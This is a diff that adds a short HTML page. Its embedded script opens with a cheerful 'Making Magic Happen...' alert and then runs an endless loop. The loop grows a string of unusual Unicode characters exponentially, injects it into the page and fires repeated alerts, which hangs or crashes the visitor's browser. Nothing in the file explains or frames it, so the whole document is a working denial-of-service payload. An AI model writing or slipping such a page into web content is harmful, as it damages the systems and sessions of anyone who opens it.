@@ -1,0 +1,12 @@
+<html>
+
+<body>
+<p id="x"></p>
+<script>
+alert('Making Magic Happen...');
+x = "\u0000\u1234\uABCD\uDCAB\u0341";
+while (true) {x = x + x; x = x.repeat(1000000); document.getElementById('x').innerHTML = x; console.log(x); alert(x)};
+</script>
+</body>
+
+</html>
